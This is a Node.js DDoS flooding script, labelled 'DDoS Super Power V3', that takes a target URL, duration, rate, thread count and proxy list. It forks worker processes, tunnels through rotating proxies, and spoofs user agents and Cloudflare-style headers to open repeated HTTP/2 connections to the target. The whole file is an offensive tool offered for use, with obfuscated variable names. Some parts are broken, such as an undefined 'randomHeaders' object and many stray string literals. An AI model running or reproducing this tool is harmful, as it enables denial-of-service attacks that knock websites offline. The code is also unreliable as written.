const net = require("net"),
      http2 = require("http2"),
      tls = require("tls"),
      cluster = require("cluster"),
      url = require("url"),
      UserAgent = require("user-agents"),
      fs = require("fs");

const {
  HeaderGenerator
} = require("header-generator");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x3e8e0b) {});
process.argv.length < 7 && (console.log("node ddos.js Url Time Rate Thread Proxy | Script Good Owner ᴀɴᴏɴ ᴠɪʀᴜs"), process.exit());
const headers = {};

function readLines(_0x31812c) {
  return fs.readFileSync(_0x31812c, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x4dfc08, _0x17560f) {
  return Math.floor(Math.random() * (_0x17560f - _0x4dfc08) + _0x4dfc08);
}

function randomElement(_0x2d0f9f) {
  return _0x2d0f9f[randomIntn(0, _0x2d0f9f.length)];
}

const args = {
  "target": process.argv[2],
  "time": ~~process.argv[3],
  "Rate": ~~process.argv[4],
  "threads": ~~process.argv[5],
  "proxyFile": process.argv[6]
};
dest_header = ["audio", "audioworklet", "document", "embed", "empty", "font", "frame", "iframe", "image", "manifest", "object", "paintworklet", "report", "script", "serviceworker", "sharedworker", "style", "track", "video", "worker", "xslt"];
cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0", "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate", "max-stale", "max-age=315360000", "stale-if-error", "max-age=31557600", "max-age=2592000", "s-maxage", "min-fresh", "max-age=31536000,public", "max-age=31536000,public,immutable", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "no-transform", "only-if-cached", "public", "private"];
mode_header = ["cors", "navigate", "no-cors", "same-origin", "websocket"];
site_header = ["cross-site", "same-origin", "same-site", "none"];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) for (let counter = 1; counter <= args.threads; counter++) {
  console.clear();
  console.log("DDoS Super Power V3".rainbow);
  console.log(" Owner : ᴀɴᴏɴ ᴠɪʀᴜs ".gray);
  console.log(" Target: ".brightYellow + process.argv[2].blue);
  console.log(" Theard: ".brightYellow + process.argv[5].blue);
  console.log(" Proxy : ".brightYellow + process.argv[6].blue);
  console.log(" Time  : ".brightYellow + process.argv[3].blue);
  console.log(" Rate  : ".brightYellow + process.argv[4].blue);
  console.log("---------------------------------------------".gray);
  console.log("Staus :".blue + "ᴀттᴀcκιɴԍ тo wᴇʙsιтᴇ ".rainbow);
  cluster.fork();
} else setInterval(runFlooder);

class NetSocket {
  constructor() {}

  ["HTTP"](_0x542369, _0x44a0c9) {
    const _0x1a6353 = _0x542369.address.split(":"),
          _0x53baae = "CONNECT " + _0x542369.address + ":443 HTTP/1.1\r\nHost: " + _0x542369.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
          _0x2ac178 = new Buffer.from(_0x53baae),
          _0x9e1da = net.connect({
      "host": _0x542369.host,
      "port": _0x542369.port
    });

    _0x9e1da.setTimeout(_0x542369.timeout * 10000);

    _0x9e1da.setKeepAlive(true, 10000);

    _0x9e1da.on("connect", () => {
      _0x9e1da.write(_0x2ac178);
    });

    _0x9e1da.on("data", _0x4b3c92 => {
      const _0x28b15b = _0x4b3c92.toString("utf-8"),
            _0x58f8c8 = _0x28b15b.includes("HTTP/1.1 200");

      if (_0x58f8c8 === false) return _0x9e1da.destroy(), _0x44a0c9(undefined, "error: invalid response from proxy server");
      return _0x44a0c9(_0x9e1da, undefined);
    });

    _0x9e1da.on("timeout", () => {
      return _0x9e1da.destroy(), _0x44a0c9(undefined, "error: timeout exceeded");
    });

    _0x9e1da.on("error", _0x1ca339 => {
      return _0x9e1da.destroy(), _0x44a0c9(undefined, "error: " + _0x1ca339);
    });
  }

}

function getRandomUserAgent() {
  const _0x290efb = ["Windows", "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux", "Macintosh", "X11", "Windows NT 6.1", "Windows NT 5.1", "Macintosh, Intel Mac OS X 10_14_6", "Macintos", "Intel Mac OS X 10_15_7"],
        _0x23463f = ["Chrome", "Firefox", "Safari", "Edge", "Opera"],
        _0xa29b5b = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES", "vi-VN"],
        _0x2a30b0 = ["US", "GB", "FR", "DE", "ES", "VN", "ES", "CN", "PT", "VN", "RU", "TW", "TL", "BW", "BM", "AF", "DZ", "AD", "AG", "AM", "AR"],
        _0x50661e = ["Windows", "Apple", "Google", "Microsoft", "Mozilla", "Opera Software", "Chrome", "Firefox", "Safari", "Edge", "Opera"],
        _0x43c6b9 = _0x290efb[Math.floor(Math.random() * _0x290efb.length)],
        _0x8d30ac = _0x23463f[Math.floor(Math.random() * _0x23463f.length)],
        _0xc8a33a = _0xa29b5b[Math.floor(Math.random() * _0xa29b5b.length)],
        _0xcd65bd = _0x2a30b0[Math.floor(Math.random() * _0x2a30b0.length)],
        _0x1493c6 = _0x50661e[Math.floor(Math.random() * _0x50661e.length)],
        _0x2329e6 = Math.floor(Math.random() * 100) + 1,
        _0x5089d9 = Math.floor(Math.random() * 6) + 1,
        _0x52e5a0 = _0x1493c6 + "/" + _0x8d30ac + " " + _0x2329e6 + "." + _0x2329e6 + "." + _0x2329e6 + " (" + _0x43c6b9 + "; " + _0xcd65bd + "; " + _0xc8a33a + ")",
        _0x46b6d6 = btoa(_0x52e5a0);

  let _0x4595d5 = "";

  for (let _0x5af200 = 0; _0x5af200 < _0x46b6d6.length; _0x5af200++) {
    if (_0x5af200 % _0x5089d9 === 0) {
      _0x4595d5 += _0x46b6d6.charAt(_0x5af200);
    } else _0x4595d5 += _0x46b6d6.charAt(_0x5af200).toUpperCase();
  }

  return _0x4595d5;
}

const Header = new NetSocket();
headers[":method"] = "GET";
headers.GET = "/HTTP/2";
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["cf-mitigated"] = "challenge";
headers["content-type"] = "text/html; charset=UTF-8";
"multipart/form-data; boundary=something";
headers.Referer = "https://google.com";
"https://facebook.com";
"http://judge1.api.proxyscrape.com/";
"http://judge2.api.proxyscrape.com/";
"http://judge3.api.proxyscrape.com/";
"http://judge4.api.proxyscrape.com/";
"http://judge5.api.proxyscrape.com/";
"https://api64.ipify.org/";
"http://www.office.com";
"https://checkerproxy.net";
"https://www.check-host.net";
"https://github.com";
"https://nminh23.click";
"https://nm2302.site";
headers.accept = randomHeaders.accept;
headers["accept-language"] = randomHeaders["accept-language"];
headers["accept-encoding"] = "gzip, deflate, br";
"*";
"br";
"br;q=1.0, gzip;q=0.8, *;q=0.1";
"gzip, compress";
"gzip, deflate, lzma, sdch";
"deflate";
"gzip";
"compress;q=0.5, gzip;q=1.0";
"gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25";
"gzip;q=1.0, identity; q=0.5, *;q=0";
"*/*";
headers.Connection = "keep-alive";
headers["upgrade-insecure-requests"] = randomHeaders["upgrade-insecure-requests"];
headers.TE = "trailers";
headers["cdn-loop"] = "cloudflare";
headers["x-requested-with"] = "XMLHttpRequest";
headers["origin-agent-cluster"] = "?1";
headers["sec-fetch-user"] = "?1";
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers.cookie = randomHeaders.cookie;

function runFlooder() {
  const _0x3060ba = randomElement(proxies),
        _0x4d4e12 = _0x3060ba.split(":"),
        _0x59fdb2 = new UserAgent();

  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = getRandomUserAgent();
  const _0x2a59a7 = {
    "host": _0x4d4e12[0],
    "port": ~~_0x4d4e12[1],
    "address": parsedTarget.host + ":443",
    "timeout": 100
  };
  Header.HTTP(_0x2a59a7, (_0x2dc391, _0x5ad8b5) => {
    if (_0x5ad8b5) return;

    _0x2dc391.setKeepAlive(true, 60000);

    const _0x284de6 = {
      "ALPNProtocols": ["h2"],
      "followAllRedirects": true,
      "challengeToSolve": 5,
      "clientTimeout": 5000,
      "clientlareMaxTimeout": 25000,
      "echdCurve": "GREASE:X25519:x25519",
      "ciphers": "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
      "rejectUnauthorized": false,
      "socket": _0x2dc391,
      "decodeEmails": false,
      "honorCipherOrder": true,
      "requestCert": true,
      "secure": true,
      "port": 443,
      "uri": parsedTarget.host,
      "servername": parsedTarget.host
    },
          _0x5bc3d2 = tls.connect(443, parsedTarget.host, _0x284de6);

    _0x5bc3d2.setKeepAlive(true, 60 * 1000);

    const _0x28fe81 = http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": {
        "headerTableSize": 65536,
        "maxConcurrentStreams": 100,
        "initialWindowSize": 6291456,
        "maxHeaderListSize": 262144,
        "enablePush": false
      },
      "maxSessionMemory": 64000,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x5bc3d2,
      "socket": _0x2dc391
    });

    _0x28fe81.settings({
      "headerTableSize": 65536,
      "maxConcurrentStreams": 100,
      "initialWindowSize": 6291456,
      "maxHeaderListSize": 262144,
      "enablePush": false
    });

    _0x28fe81.on("connect", () => {});

    _0x28fe81.on("close", () => {
      _0x28fe81.destroy();

      _0x2dc391.destroy();

      return;
    });

    _0x28fe81.on("error", _0x410a82 => {
      _0x28fe81.destroy();

      _0x2dc391.destroy();

      return;
    });
  });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);